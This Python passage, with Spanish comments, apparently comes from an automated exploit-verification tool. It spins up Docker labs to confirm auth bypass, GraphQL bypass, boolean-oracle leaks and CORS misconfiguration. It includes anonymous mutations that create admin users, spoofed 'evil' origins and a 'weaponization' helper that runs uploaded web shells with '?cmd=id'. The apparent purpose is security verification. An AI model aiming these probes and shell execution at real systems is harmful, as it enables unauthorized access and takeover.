            # Require confirm_string OR body contains non-trivial sensitive content.
            # Without this gate, any publicly-accessible endpoint returns 200 and
            # would be incorrectly marked as a missing-auth vulnerability (FP).
            _body_has_sensitive = bool(re.search(
                r'(?i)("id"\s*:|"email"\s*:|"password"\s*:|"token"\s*:|"secret"\s*:'
                r'|"admin"\s*:|"role"\s*:|"permissions"\s*:|"apiKey"\s*:'
                r'|"access_token"\s*:|"auth"\s*:)',
                body_normal[:2000]
            ))
            string_hit = (confirm_string and confirm_string in body_normal) or _body_has_sensitive
            if string_hit:
                ok_res = WpVerifyResult()
                ok_res.verified = True
                ok_res.ok = True
                ok_res.detail = (
                    f"ACCESO NO AUTENTICADO CONFIRMADO: {m} {endpoint} "
                    f"responde HTTP {status_normal} sin credenciales ni bypass header"
                    + (f" — confirm_string '{confirm_string}' presente" if confirm_string else "")
                )
                ok_res.evidence = {
                    "base_url": base_url, "endpoint": endpoint, "metodo": m,
                    "status_sin_auth": status_normal,
                    "body_snippet": body_normal[:500],
                    "vuln_class": vuln_class,
                }
                step(f"  VERIFICADO (acceso no autenticado): HTTP {status_normal}")
                # Escalate impact while lab is still up
                _esc = _escalate_missing_auth_impact(
                    base_url, endpoint, {}, step, budget_s=60.0)
                if _esc:
                    ok_res.evidence["impact_escalation"] = _esc
                    ok_res.detail += f"\n\nImpacto escalado: {_esc['escalation_summary']}"
                    step(f"  escalación: {_esc['impact_class']} / {_esc['max_impact_found']}")
                return ok_res
            step(f"  endpoint accesible ({status_normal}) pero sin confirm_string ni campos sensibles en body — continuando con bypass headers")

        # Try each candidate in the same running lab
        last_res = res
        for hdr, val in parsed:
            step(f"  candidato bypass: {hdr}: {val[:60]!r}")
            try:
                r_bypass = _http_request(m, url, timeout=10, allow_redirects=False,
                                         headers={hdr: val})
                status_bypass = r_bypass.status_code
                body_bypass = getattr(r_bypass, "text", "") or ""
            except Exception as e:
                step(f"  candidato fallido ({hdr}): error — {e}")
                continue

            blocked = status_normal not in range(200, 300)
            bypassed = status_bypass in range(200, 300)
            string_ok = (not confirm_string) or (confirm_string in body_bypass)

            cand_res = WpVerifyResult()
            cand_res.evidence = {
                "base_url": base_url, "endpoint": endpoint, "metodo": m,
                "bypass_header": hdr, "bypass_value": val,
                "status_sin_bypass": status_normal, "status_con_bypass": status_bypass,
                "confirm_string": confirm_string,
                "respuesta_cuerpo_recorte": body_bypass[:500],
            }
            if blocked and bypassed and string_ok:
                cand_res.verified = True
                cand_res.ok = True
                cand_res.detail = (
                    f"BYPASS confirmado: sin '{hdr}' el servidor responde {status_normal}; "
                    f"con '{hdr}: {val[:40]}' responde {status_bypass}"
                    + (f" y el cuerpo contiene '{confirm_string}'" if confirm_string else "")
                )
                step(f"  BYPASS CONFIRMADO con {hdr}: {val[:60]!r}")
                # Escalate impact for missing-auth/bypass vuln classes
                _ESCALATE_CLASSES = {"missing-authorization", "auth-bypass",
                                      "broken-access-control", "idor"}
                if vuln_class and vuln_class.lower().replace(" ", "-") in _ESCALATE_CLASSES:
                    _esc = _escalate_missing_auth_impact(
                        base_url, endpoint, {hdr: val}, step, budget_s=60.0)
                    if _esc:
                        cand_res.evidence["impact_escalation"] = _esc
                        cand_res.detail += f"\n\nImpacto escalado: {_esc['escalation_summary']}"
                        step(f"  escalación: {_esc['impact_class']} / {_esc['max_impact_found']}")
                return cand_res
            else:
                cand_res.ok = True
                cand_res.detail = (
                    f"candidato '{hdr}': sin_bypass={status_normal} con_bypass={status_bypass}"
                    + (" — sin bypas: endpoint ya 2xx (no bloqueado)" if not blocked else "")
                )
                step(f"  candidato fallido ({hdr}): {cand_res.detail[:100]}")
                last_res = cand_res

        last_res.ok = True
        last_res.detail = (last_res.detail or
                           f"ninguno de los {len(parsed)} candidatos consiguio bypass")
        return last_res

    except Exception as e:
        res.detail = f"error en iteracion de candidatos: {e}"
        return res
    finally:
        step("desmontando el laboratorio generico (bypass candidatos)...")
        if lab is not None:
            lab.teardown()


# ── GraphQL helpers ───────────────────────────────────────────────────────────

def _graphql_post(base_url: str, endpoint: str, query: str,
                  variables: Optional[dict] = None,
                  auth_header: str = "",
                  step: Optional[Callable] = None) -> dict:
    """POST a GraphQL query and return the parsed JSON response body or {}."""
    import json as _json
    _step = step or (lambda _m: None)
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    if auth_header:
        headers["Authorization"] = auth_header
    payload = {"query": query}
    if variables:
        payload["variables"] = variables
    body = _json.dumps(payload).encode()
    try:
        status, _, resp = _http_lab(base_url, endpoint, "POST",
                                    headers=headers, body=body, timeout=15.0)
        if resp:
            return _json.loads(resp.decode("utf-8", "replace"))
    except Exception as exc:
        _step(f"  graphql_post error: {exc}")
    return {}


def _discover_graphql_endpoints(base_url: str,
                                step: Optional[Callable] = None) -> List[str]:
    """Probe common GraphQL endpoint paths and return confirmed ones.

    A path is confirmed when it responds to a minimal introspection query
    with data containing '__typename' or '__schema', or returns HTTP 200.
    """
    _step = step or (lambda _m: None)
    _CANDIDATES = ["/graphql", "/api/graphql", "/graphql/v1", "/v1/graphql",
                   "/api/v1/graphql", "/cms/graphql", "/content/graphql"]
    _INTRO = '{"query":"{ __typename }"}'
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    confirmed: List[str] = []
    for ep in _CANDIDATES:
        try:
            status, _, resp_b = _http_lab(base_url, ep, "POST",
                                          headers=headers,
                                          body=_INTRO.encode(), timeout=8.0)
            if status in (200, 400):
                body = (resp_b or b"").decode("utf-8", "replace")
                if "__typename" in body or "__schema" in body or status == 200:
                    _step(f"  graphql: endpoint confirmado {ep} (status={status})")
                    confirmed.append(ep)
        except Exception:
            continue
    return confirmed


def _graphql_schema_probe(base_url: str, endpoint: str,
                           auth_header: str = "",
                           step: Optional[Callable] = None) -> dict:
    """Deep GraphQL schema introspection: extract types, queries, mutations with args.

    Returns:
    {
      "queries":   [{"name": "...", "args": ["id", "filter", ...]}, ...],
      "mutations": [{"name": "...", "args": ["input", "id", ...]}, ...],
      "sensitive_fields": ["accessToken", "password", "apiKey", ...],
      "auth_required_queries": ["adminUsers", "secretConfig", ...],
    }

    Useful for CVEs where the vulnerable query is not documented:
    extract all mutations with 'file', 'path', 'url' args → LFI/SSRF candidates.
    Extract all queries without auth → missing-auth candidates.
    """
    _step = step or (lambda _m: None)
    _INTROSPECT_QUERY = {
        "query": """
        {
          __schema {
            queryType { fields { name args { name type { name kind } } } }
            mutationType { fields { name args { name type { name kind } } } }
          }
        }
        """
    }
    headers: dict = {"Content-Type": "application/json", "Accept": "application/json"}
    if auth_header:
        # auth_header format: "Bearer token" or "Token token" etc.
        headers["Authorization"] = auth_header

    result: dict = {
        "queries": [], "mutations": [],
        "sensitive_fields": [], "auth_required_queries": [],
    }

    _SENSITIVE_PATTERNS = {
        "credential": ["password", "passwd", "secret", "token", "apikey", "api_key",
                        "accesstoken", "access_token", "privatekey", "private_key"],
        "admin": ["admin", "root", "superuser", "privilege"],
        "pii": ["email", "phone", "ssn", "creditcard"],
    }
    _INJECTION_PATTERNS = {
        "lfi_ssrf": ["file", "path", "url", "uri", "src", "source", "redirect"],
        "sqli": ["query", "filter", "search", "where", "id", "ids"],
    }

    try:
        import json as _json
        _body = _json.dumps(_INTROSPECT_QUERY).encode()
        _status, _, _resp_b = _http_lab(
            base_url, endpoint, "POST",
            headers=headers, body=_body, timeout=10.0)
        if _status not in (200, 201):
            return result
        _resp = _json.loads((_resp_b or b"").decode("utf-8", "replace"))
        _schema = (_resp.get("data") or {}).get("__schema") or {}

        # Extract queries
        _qt = _schema.get("queryType") or {}
        for _field in (_qt.get("fields") or []):
            _name = _field.get("name", "")
            _args = [a.get("name", "") for a in (_field.get("args") or [])]
            result["queries"].append({"name": _name, "args": _args})
            # Flag sensitive
            _n_low = _name.lower()
            if any(sp in _n_low for sp in _SENSITIVE_PATTERNS["credential"]):
                result["sensitive_fields"].append(_name)
            if any(sp in _n_low for sp in _SENSITIVE_PATTERNS["admin"]):
                result["auth_required_queries"].append(_name)

        # Extract mutations
        _mt = _schema.get("mutationType") or {}
        for _field in (_mt.get("fields") or []):
            _name = _field.get("name", "")
            _args = [a.get("name", "") for a in (_field.get("args") or [])]
            result["mutations"].append({"name": _name, "args": _args})

        # Find injection-candidate args across all operations
        _all_ops = result["queries"] + result["mutations"]
        _lfi_candidates = []
        for _op in _all_ops:
            for _arg in _op.get("args", []):
                _a_low = _arg.lower()
                if any(pat in _a_low for pat in _INJECTION_PATTERNS["lfi_ssrf"]):
                    _lfi_candidates.append(f"{_op['name']}.{_arg}")
        if _lfi_candidates:
            result["lfi_ssrf_candidates"] = _lfi_candidates[:10]

        _total = len(result["queries"]) + len(result["mutations"])
        _step(f"  graphql-schema: {_total} operaciones extraídas "
              f"({len(result['queries'])} queries, {len(result['mutations'])} mutations)")
        if result.get("auth_required_queries"):
            _step(f"  graphql-schema: posibles operaciones admin: "
                  f"{result['auth_required_queries'][:3]}")
        if result.get("lfi_ssrf_candidates"):
            _step(f"  graphql-schema: args de file/path/url: "
                  f"{result['lfi_ssrf_candidates'][:3]}")

    except Exception as _e:
        _step(f"  graphql-schema: error: {_e}")

    return result


# ── GraphQL auth-bypass verifier ──────────────────────────────────────────────

def verify_generic_graphql_bypass(
    source_dir: str, graphql_endpoint: str,
    forbidden_query: str, confirm_field: str,
    bypass_header: str = "", bypass_value: str = "",
    anon_expected_status: int = 403,
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
) -> WpVerifyResult:
    """Verifica un auth-bypass en un endpoint GraphQL (p.ej. Craft CMS CVE-2026-124427).

    Mecanismo:
    1) Levanta el lab efimero con _bootstrap_generic_lab.
    2) Envia una query GraphQL de introspección para confirmar que el endpoint existe.
    3) Envia `forbidden_query` SIN autenticación: espera rechazo (403/401 o error de auth).
    4) Envia `forbidden_query` CON la cabecera de bypass o sin credenciales pero con el
       vector de bypass (prev/next field, __typename abuse, etc.): si la respuesta 2xx
       contiene `confirm_field`, la vulnerabilidad queda VERIFICADA.

    `forbidden_query`: query GraphQL completa que debería requerir autenticación.
    `confirm_field`:   subcadena que debe aparecer en la respuesta exitosa (p.ej. un
                       nombre de campo privado, un secreto, el token de sesión).
    `bypass_header` / `bypass_value`: cabecera de bypass opcional (vacío si el bypass
                       es solo estructural en la query).
    `anon_expected_status`: código esperado al enviar sin autenticación (default 403).
    """
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    tup = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                  dockerfile_body=dockerfile_body, extra_files=extra_files)
    if tup is None:
        return res
    lab, base_url, container = tup
    try:
        endpoint_url = base_url.rstrip("/") + "/" + graphql_endpoint.lstrip("/")
        gql_headers = {"Content-Type": "application/json", "Accept": "application/json"}

        # Step 0: try alternate GraphQL endpoint paths if the given one doesn't respond
        _gql_ep_candidates = [graphql_endpoint]
        for _alt_gql in ("/graphql", "/api/graphql", "/graphiql", "/graphql/v1",
                         "/v1/graphql", "/query", "/gql"):
            if _alt_gql != graphql_endpoint:
                _gql_ep_candidates.append(_alt_gql)

        _working_gql_ep = graphql_endpoint
        for _gql_cand in _gql_ep_candidates:
            _probe_intro = '{"query":"{ __schema { queryType { name } } }"}'
            _s_p, _, _b_p = _http_lab(base_url, _gql_cand, "POST",
                                       headers=gql_headers, body=_probe_intro.encode(), timeout=10.0)
            if _s_p != 0 and _b_p is not None:
                _working_gql_ep = _gql_cand
                break
        if _working_gql_ep != graphql_endpoint:
            step(f"GraphQL: endpoint {graphql_endpoint!r} no responde; usando {_working_gql_ep!r}")
            graphql_endpoint = _working_gql_ep

        # Step 1: introspección — confirmar que el endpoint GraphQL responde
        step(f"Paso 1: introspección GraphQL en {graphql_endpoint}")
        intro_query = '{"query":"{ __schema { queryType { name } } }"}'
        s_intro, _, b_intro = _http_lab(
            base_url, graphql_endpoint, "POST",
            headers=gql_headers, body=intro_query.encode(), timeout=15.0)
        if s_intro == 0 or b_intro is None:
            res.detail = f"endpoint GraphQL {graphql_endpoint} no responde"
            res.ok = True
            return res
        has_gql = b"__schema" in b_intro or b"queryType" in b_intro or s_intro == 200
        # Anonymous introspection fully enabled = information disclosure by itself
        _full_intro = b"__schema" in b_intro and b"types" in b_intro
        if _full_intro and not confirm_field:
            res.verified = True
            res.ok = True
            _intro_body = b_intro[:500].decode("utf-8", "replace")
            res.evidence["graphql_introspection_anon"] = {"enabled": True, "body": _intro_body}
            res.detail = ("GRAPHQL INTROSPECTION anonima habilitada — esquema completo accesible "
                          "sin autenticacion (information disclosure confirmado)")
            step("VERIFICADO: introspection anonima habilitada → confirmed")
        step(f"  introspección: status={s_intro} graphql={'SI' if has_gql else 'NO'}")
        res.evidence["intro_status"] = s_intro
        res.evidence["intro_body_recorte"] = b_intro[:200].decode("utf-8", "replace")

        # Step 2: query restringida SIN autenticación → debe rechazarse
        step(f"Paso 2: query restringida SIN autenticación (esperado {anon_expected_status})")
        body_forbidden = json.dumps({"query": forbidden_query}).encode()
        s_anon, _, b_anon = _http_lab(
            base_url, graphql_endpoint, "POST",
            headers=gql_headers, body=body_forbidden, timeout=15.0)
        anon_body = (b_anon or b"").decode("utf-8", "replace")
        step(f"  sin auth: status={s_anon} body={anon_body[:120]!r}")
        res.evidence["anon_status"] = s_anon
        res.evidence["anon_body_recorte"] = anon_body[:300]

        # Step 3: bypass — con cabecera o query modificada
        bypass_hdrs = dict(gql_headers)
        if bypass_header:
            bypass_hdrs[bypass_header] = bypass_value
            step(f"Paso 3: query con cabecera bypass {bypass_header}: {bypass_value[:60]}")
        else:
            step("Paso 3: query con vector de bypass estructural (sin cabecera extra)")
        s_byp, _, b_byp = _http_lab(
            base_url, graphql_endpoint, "POST",
            headers=bypass_hdrs, body=body_forbidden, timeout=15.0)
        byp_body = (b_byp or b"").decode("utf-8", "replace")
        step(f"  con bypass: status={s_byp} body={byp_body[:200]!r}")
        res.evidence["bypass_status"] = s_byp
        res.evidence["bypass_body_recorte"] = byp_body[:500]
        res.evidence["endpoint"] = graphql_endpoint
        res.evidence["metodo"] = "POST"
        res.evidence["base_url"] = base_url
        res.evidence["contenedor"] = container

        confirmed = (s_byp == 200 and confirm_field and confirm_field in byp_body)
        if not confirmed and s_byp == 200 and not confirm_field:
            # GraphQL always returns 200 — status code alone is not proof.
            # Require: anon response contained an auth error in body AND bypass body does not.
            _anon_has_auth_err = bool(re.search(
                r'(?i)(unauthorized|unauthenticated|not authorized|access denied|forbidden|'
                r'must be logged in|login required|permission denied)',
                anon_body))
            _byp_has_auth_err = bool(re.search(
                r'(?i)(unauthorized|unauthenticated|not authorized|access denied|forbidden|'
                r'must be logged in|login required|permission denied)',
                byp_body))
            confirmed = _anon_has_auth_err and not _byp_has_auth_err and s_anon != 200

        if confirmed:
            res.verified = True
            res.ok = True
            res.evidence["respuesta_cuerpo_recorte"] = byp_body[:500]
            res.detail = (f"GRAPHQL AUTH-BYPASS CONFIRMADO: query restringida devuelve 200 "
                          f"con el vector de bypass (campo '{confirm_field}' presente). "
                          f"Sin bypass: status={s_anon}. Con bypass: status={s_byp}.")
            step(f"VERIFICADO: GraphQL auth-bypass confirmado — '{confirm_field}' en respuesta")
            _add_exploit_evidence(
                res=res, method="POST", url=endpoint_url,
                resp_or_body=byp_body[:3000], highlight=confirm_field,
                caption_es=(f"GRAPHQL AUTH-BYPASS CONFIRMADO: campo '{confirm_field}' accesible "
                            f"sin autenticacion via bypass — status {s_byp}."),
                caption_en=(f"GRAPHQL AUTH-BYPASS CONFIRMED: field '{confirm_field}' accessible "
                            f"without auth via bypass — status {s_byp}."),
            )
        else:
            res.ok = True
            res.detail = (f"el vector de bypass no confirmo acceso no autorizado al campo "
                          f"'{confirm_field}' — sin bypass: {s_anon}, con bypass: {s_byp}")
            # Fallback: try unauthenticated mutation — proves write access without auth
            if not res.verified:
                _ANON_MUTATIONS = [
                    '{"query":"mutation { createUser(input: {email: \\"t@t.com\\", password: \\"t\\", role: \\"admin\\"}) { id } }"}',
                    '{"query":"mutation { register(email: \\"t@t.com\\", password: \\"t\\") { token } }"}',
                    '{"query":"mutation { updateSetting(key: \\"debug\\", value: true) { ok } }"}',
                ]
                for _mut in _ANON_MUTATIONS:
                    try:
                        _ms, _, _mb = _http_lab(base_url, graphql_endpoint, "POST",
                                                headers=gql_headers, body=_mut.encode(), timeout=10.0)
                        _mb_str = (_mb or b"").decode("utf-8", "replace")
                        _has_data = (bool(re.search(r'"data"\s*:\s*\{', _mb_str)) and
                                     "null" not in _mb_str.split('"data"', 1)[-1][:60])
                        _no_auth_err = not bool(re.search(
                            r'(?i)(unauthorized|unauthenticated|not authorized|forbidden)', _mb_str))
                        if _ms == 200 and _has_data and _no_auth_err:
                            res.verified = True
                            res.ok = True
                            res.evidence["graphql_anon_mutation"] = {
                                "mutation": _mut[:120], "status": _ms, "body": _mb_str[:300]}
                            res.detail = ("GRAPHQL MUTATION sin autenticacion: mutation ejecutada "
                                          "con exito sin credenciales (write access sin auth)")
                            step("VERIFICADO: GraphQL mutation anonima exitosa → confirmed")
                            break
                    except Exception:
                        pass
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    except Exception as e:
        res.detail = f"error inesperado en verify_generic_graphql_bypass: {e}"
        return res
    finally:
        step("desmontando el laboratorio generico...")
        if lab is not None:
            lab.teardown()


# ── Boolean oracle / data-leak verifier ───────────────────────────────────────

def verify_generic_boolean_oracle(
    source_dir: str, endpoint: str, http_method: str,
    true_param: str, true_value: str,
    false_param: str, false_value: str,
    confirm_field: str = "",
    extra_headers: Optional[dict] = None,
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    prebuilt_url: str = "",
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
) -> WpVerifyResult:
    """Verifica una vulnerabilidad de tipo oracle booleano (p.ej. Strapi CVE-2026-27886).

    El patrón: el servidor filtra registros según una condición booleana controlada por
    el atacante. La diferencia de respuesta entre condición TRUE y FALSE confirma el leak.

    Mecanismo:
    1) Levanta el lab efimero.
    2) Envia la petición con `true_param=true_value` (condición siempre verdadera):
       espera respuesta con contenido (lista no vacía, campo con datos).
    3) Envia la petición con `false_param=false_value` (condición siempre falsa):
       espera respuesta vacía o diferente.
    4) Si la diferencia de bytes entre TRUE y FALSE supera un umbral, el oracle está
       confirmado. Si además `confirm_field` aparece solo en la respuesta TRUE, es prueba
       directa de exfiltración de datos.

    `true_param`/`true_value`:  parámetro y valor que hace la condición TRUE (p.ej. `where[id][$gt]=0`).
    `false_param`/`false_value`: parámetro y valor que hace la condición FALSE (p.ej. `where[id][$lt]=0`).
    `confirm_field`: campo que debe aparecer SOLO en la respuesta TRUE (p.ej. `"email"`, `"token"`).
    """
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    tup = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                  prebuilt_url=prebuilt_url,
                                  dockerfile_body=dockerfile_body, extra_files=extra_files)
    if tup is None:
        return res
    lab, base_url, container = tup
    try:
        hdrs = dict(extra_headers or {})
        hdrs.setdefault("Accept", "application/json")

        def _get(param, value):
            sep = "&" if "?" in endpoint else "?"
            ep_q = endpoint + sep + f"{param}={value}"
            full_url = base_url.rstrip("/") + ep_q
            r = _http_request(http_method.upper(), full_url,
                               headers=hdrs, timeout=15.0)
            return r.status_code, (r.content or b"").decode("utf-8", "replace")

        # Baseline: two requests with the TRUE condition to measure natural jitter
        step("Paso 0: baseline jitter — dos peticiones TRUE para medir varianza natural")
        _, b_base1 = _get(true_param, true_value)
        _, b_base2 = _get(true_param, true_value)
        _baseline_jitter = abs(len(b_base1) - len(b_base2))
        step(f"  baseline jitter: {_baseline_jitter}B entre las dos peticiones identicas")

        step(f"Paso 1: condición TRUE — {true_param}={true_value}")
        s_true, b_true = _get(true_param, true_value)
        step(f"  TRUE: status={s_true} bytes={len(b_true)} preview={b_true[:120]!r}")

        step(f"Paso 2: condición FALSE — {false_param}={false_value}")
        s_false, b_false = _get(false_param, false_value)
        step(f"  FALSE: status={s_false} bytes={len(b_false)} preview={b_false[:120]!r}")

        res.evidence.update({
            "endpoint": endpoint, "metodo": http_method.upper(),
            "base_url": base_url, "contenedor": container,
            "true_status": s_true, "false_status": s_false,
            "true_bytes": len(b_true), "false_bytes": len(b_false),
            "baseline_jitter_bytes": _baseline_jitter,
            "true_body_recorte": b_true[:300], "false_body_recorte": b_false[:300],
        })

        byte_diff = abs(len(b_true) - len(b_false))
        field_only_in_true = confirm_field and confirm_field in b_true and confirm_field not in b_false
        # Must exceed baseline jitter by at least 2× to avoid natural variance FP
        _byte_diff_significant = byte_diff > max(100, _baseline_jitter * 2 + 20)
        confirmed = (s_true == 200 and byte_diff > 20) and (field_only_in_true or _byte_diff_significant)

        if confirmed:
            res.verified = True
            res.ok = True
            res.evidence["diferencia_bytes"] = byte_diff
            res.evidence["respuesta_cuerpo_recorte"] = b_true[:500]
            res.detail = (f"BOOLEAN ORACLE CONFIRMADO: diferencia de {byte_diff} bytes entre "
                          f"condición TRUE ({len(b_true)}B) y FALSE ({len(b_false)}B). "
                          + (f"Campo '{confirm_field}' aparece SOLO en TRUE." if field_only_in_true else ""))
            step(f"VERIFICADO: boolean oracle — dif={byte_diff}B campo={confirm_field}")
            _add_exploit_evidence(
                res=res, method=http_method.upper(), url=base_url + endpoint,
                resp_or_body=b_true, highlight=confirm_field or "",
                caption_es=(f"BOOLEAN ORACLE confirmado: TRUE={len(b_true)}B, "
                            f"FALSE={len(b_false)}B — diferencia de {byte_diff} bytes."),
                caption_en=(f"BOOLEAN ORACLE confirmed: TRUE={len(b_true)}B, "
                            f"FALSE={len(b_false)}B — {byte_diff}-byte differential."),
            )
        else:
            res.ok = True
            res.detail = (f"diferencia TRUE/FALSE insuficiente para confirmar oracle "
                          f"({byte_diff}B) — puede que la condición no controle la query, "
                          f"o que el endpoint filtre por otro mecanismo")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    except Exception as e:
        res.detail = f"error inesperado en verify_generic_boolean_oracle: {e}"
        return res
    finally:
        if lab is not None:
            step("desmontando el laboratorio generico...")
            if lab is not None:
                lab.teardown()


def verify_generic_cors_misconfig(
    source_dir: str, endpoint: str, http_method: str = "GET",
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0, custom_headers: Optional[dict] = None,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
    confirm_string: str = "",
    docker_image: str = "",
) -> WpVerifyResult:
    """Verifica CORS misconfiguration: reflexion del Origin en Access-Control-Allow-Origin
    + Access-Control-Allow-Credentials: true (CVE-2025-53092 Strapi y otros).

    Mecanismo:
    1) Levanta el lab efimero con el Dockerfile/compose del codigo descargado.
    2) Envia la misma peticion SIN Origin y CON Origin: http://<token>.invalid.
    3) CONFIRMADO si:
       a) Access-Control-Allow-Origin en la respuesta REFLEJA el Origin enviado (no '*')
       b) Access-Control-Allow-Credentials: true esta presente
    Si solo se da (a) sin (b), reporta 'cors-weak' (critico-con-matices).
    Si Access-Control-Allow-Origin: * sin Credentials → no es ACAO reflection.
    Prueba multiples endpoints comunes (/api/, /api/users, /) si el endpoint dado falla."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                   dockerfile_body=dockerfile_body, extra_files=extra_files,
                                   docker_image=docker_image)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        m = (http_method or "GET").upper().split("/")[0].strip() or "GET"
        cors_token = f"http://binoracle-cors-{_token()}.invalid"
        step(f"probando CORS reflection con Origin: {cors_token}")

        # Candidates: LLM-provided endpoint + common fallbacks
        candidates = [endpoint] if endpoint else []
        for ep in ["/api/", "/api/users", "/api/users?pageSize=1", "/api/auth/local",
                   "/api/content-manager/collection-types", "/"]:
            if ep not in candidates:
                candidates.append(ep)

        tried = []
        found = False
        result_data: dict = {}
        # Try multiple Origin values: random subdomain, null, trusted-subdomain bypass
        _origin_candidates = [cors_token, "null", f"https://evil.{cors_token.split('//')[1]}"]
        for ep in candidates:
            if found:
                break
            url = base_url + ep
            for _test_origin in _origin_candidates:
                try:
                    r = _http_request(m, url, timeout=15,
                                      headers={"Origin": _test_origin, **(custom_headers or {})})
                except Exception as e:
                    tried.append({"endpoint": ep, "origin": _test_origin, "error": str(e)})
                    continue
                resp_body = (getattr(r, "content", b"") or b"").decode("utf-8", errors="replace")
                hdrs = {k.lower(): v for k, v in (getattr(r, "headers", {}) or {}).items()}
                acao = hdrs.get("access-control-allow-origin", "")
                acac = hdrs.get("access-control-allow-credentials", "").strip().lower()
                reflected = (_test_origin in acao or acao.strip() == _test_origin.strip()
                             or (_test_origin == "null" and acao.lower() == "null"))
                credentials_true = acac == "true"
                confirm_found = bool(confirm_string and confirm_string in resp_body)
                tried.append({"endpoint": ep, "origin": _test_origin, "acao": acao, "acac": acac,
                              "reflejado": reflected, "credentials": credentials_true,
                              "confirm_found": confirm_found, "status": r.status_code})
                step(f"  {ep} [Origin={_test_origin!r}] → ACAO: {acao!r}, ACAC: {acac!r}")
                if reflected:
                    found = True
                    result_data = {"endpoint": ep, "origin": _test_origin, "acao": acao, "acac": acac,
                                   "reflejado": reflected, "credentials": credentials_true,
                                   "confirm_found": confirm_found,
                                   "resp_body_preview": resp_body[:300]}
                    break
            # Also try OPTIONS preflight — some CORS only triggers on preflight
            if not found:
                try:
                    r_opt = _http_request("OPTIONS", url, timeout=15,
                                          headers={"Origin": cors_token,
                                                   "Access-Control-Request-Method": m,
                                                   **(custom_headers or {})})
                    hdrs_opt = {k.lower(): v for k, v in (getattr(r_opt, "headers", {}) or {}).items()}
                    acao_opt = hdrs_opt.get("access-control-allow-origin", "")
                    acac_opt = hdrs_opt.get("access-control-allow-credentials", "").strip().lower()
                    if cors_token in acao_opt:
                        found = True
                        result_data = {"endpoint": ep, "origin": cors_token, "acao": acao_opt,
                                       "acac": acac_opt, "reflejado": True,
                                       "credentials": acac_opt == "true",
                                       "confirm_found": False, "resp_body_preview": "",
                                       "via_options_preflight": True}
                        tried.append({"endpoint": ep, "method": "OPTIONS", "acao": acao_opt,
                                     "acac": acac_opt, "reflejado": True})
                        step(f"  {ep} [OPTIONS preflight] → ACAO: {acao_opt!r} — CORS reflection via preflight!")
                except Exception:
                    pass
            if found:
                break
        # (loop-local try/except removed — now inline per-origin above)

        res.evidence["intentos"] = tried
        if found:
            res.verified = True
            res.ok = True
            rd = result_data
            if rd.get("credentials"):
                res.detail = (f"CORS MISCONFIGURATION CONFIRMADA: {rd['endpoint']} refleja "
                              f"el Origin del atacante (ACAO={rd['acao']!r}) con "
                              f"Access-Control-Allow-Credentials: true — permite peticiones "
                              f"cross-origin autenticadas desde dominios arbitrarios.")
                step(f"VERIFICADO (cors+credentials): {rd['endpoint']} — credenciales cross-origin "
                     f"habilitadas para origen arbitrario")
            else:
                res.detail = (f"CORS REFLECTION (sin credentials): {rd['endpoint']} refleja "
                              f"el Origin (ACAO={rd['acao']!r}) pero sin Credentials:true — "
                              f"riesgo menor (no afecta requests autenticados).")
                step(f"VERIFICADO (cors-reflection): {rd['endpoint']} — reflection sin credentials")
            _cors_body = (f"Access-Control-Allow-Origin: {rd['acao']}\n"
                          f"Access-Control-Allow-Credentials: {rd['acac']}\n\n"
                          f"Origin enviado: {cors_token}\n"
                          f"Endpoint: {rd['endpoint']}"
                          + (f"\n\nRespuesta (recorte):\n{rd.get('resp_body_preview','')}"
                             if rd.get("confirm_found") else ""))
            _add_exploit_evidence(
                res=res, method=m, url=base_url + rd["endpoint"],
                resp_or_body=_cors_body,
                highlight=cors_token.split("//")[1] if "//" in cors_token else cors_token,
                caption_es=(f"CORS MISCONFIGURATION CONFIRMADA: ACAO={rd['acao']!r} "
                            f"refleja el Origin del atacante"
                            + (" con Credentials:true." if rd.get("credentials") else " (sin credentials).")),
                caption_en=(f"CORS MISCONFIGURATION CONFIRMED: ACAO={rd['acao']!r} "
                            f"reflects attacker Origin"
                            + (" with Credentials:true." if rd.get("credentials") else " (no credentials).")),
            )
        else:
            res.ok = True
            res.detail = (f"CORS reflection no detectada en {len(tried)} endpoints — "
                          f"ninguno reflejo el Origin en Access-Control-Allow-Origin")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    except Exception as e:
        res.detail = f"error inesperado en verify_generic_cors_misconfig: {e}"
        return res
    finally:
        step("desmontando el laboratorio generico...")
        if lab is not None:
            lab.teardown()


# ---------------------------------------------------------------------------
# Post-verification weaponization helpers
# ---------------------------------------------------------------------------

def _try_execute_uploaded_shell(base_url: str, shell_name: str, container_path: str,
                                 step, upload_url_hint: str = "") -> dict:
    """After file upload is confirmed (shell saved on disk), try to execute it via HTTP.

    Probes common WordPress/generic upload URL paths to find where the server
    exposes the uploaded file, then sends ?cmd=id to confirm RCE.
    Returns weaponization dict or {}.
    """
    try:
        import requests as _req
        import re as _re
        sess = _req.Session()
        sess.headers["User-Agent"] = "binoracle-weaponize"
        # Common paths where WordPress and generic apps serve uploaded files
        _upload_paths = [
            f"/wp-content/uploads/{shell_name}",
            f"/wp-content/uploads/2024/{shell_name}",
